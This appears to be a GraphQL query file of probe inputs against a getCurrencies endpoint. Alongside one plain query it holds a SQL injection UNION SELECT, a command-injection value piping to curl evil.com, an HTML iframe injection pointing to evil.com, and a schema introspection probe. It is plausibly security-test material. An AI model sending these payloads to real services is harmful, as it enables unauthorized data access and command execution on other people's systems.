query.query:
query {
  getCurrencies {
    id
    abbreviation
    symbol
    rate
    country
  }
}

query {
  getCurrencies(filter: "1' UNION SELECT NULL,version(),NULL,NULL,NULL-- ") {
    id
    abbreviation
  }
}

query {
  getCurrencies(exportCmd: "| curl evil.com") {
    symbol
    rate
  }
}

query {
  getCurrencies {
    country(input: "<h1>Free Money</h1><iframe src='evil.com'>")
    symbol
  }
}

query {
  getCurrencies {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      description
      fields(includeDeprecated: true) {
        name
        type { name kind }
      }
    }
  }
}
